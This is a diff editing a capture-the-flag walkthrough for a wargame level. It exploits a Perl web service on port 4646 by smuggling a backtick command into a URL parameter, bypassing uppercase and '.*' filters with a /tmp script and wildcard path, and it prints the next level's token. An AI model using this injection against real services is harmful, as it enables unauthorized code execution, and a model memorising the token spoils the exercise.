@@ -1,21 +1,25 @@
 # Explanations of steps for level12
 
-We can see a perl file in the home, let cat it
+We can see a perl file in the home, let's cat it
 We can see after read and test, a server is running on port 4646, we can test it with curl
 	curl localhost:4646
 
-We also can see it take 2 parameters in URL x and y , and 1st one is passed to 2 regex and passed to a "egrep" shell command
-We can so easy inject some code to execute with the "egrep" in shell command 
-but 2 regex modify our string, 1st one transform all char in uppercase, the second one cut all .* so no .sh
-we so can write a script in /tmp with the commande we want executed in lowercase and make it executable so
+We can also see it takes 2 parameters in URL x and y , 1st one is passed to 2 regex
+then passed to a "egrep" shell command
+We can easly inject some code to execute with the "egrep" shell command
+But 2 regex modify our string, 1st one transform all char in uppercase,
+the second one cut all .* so no .sh
+We can write a script in /tmp with the commande we want executed in lowercase and make
+it executable so :
 	echo "#!/bin/bash" > /tmp/SCRIPT12
 	echo "getflag > /tmp/token12" >> /tmp/SCRIPT12
 	chmod +x /tmp/SCRIPT12
 
-and then do a curl command to execute the script, let do a wildcard to go in all root paths (/*/)
+Now we can do a curl command to execute the script, let's do a wildcard
+to go in all root paths (/*/)
 	curl localhost:4646?x=\`/*/SCRIPT12\`
 
-And enjoy, the token is printed in /tmp/token12
+The token is printed in /tmp/token12
 	cat /tmp/token12
 
 Token for level13 is: "g1qKMiRpXf53AWhDaU7FEkczr"
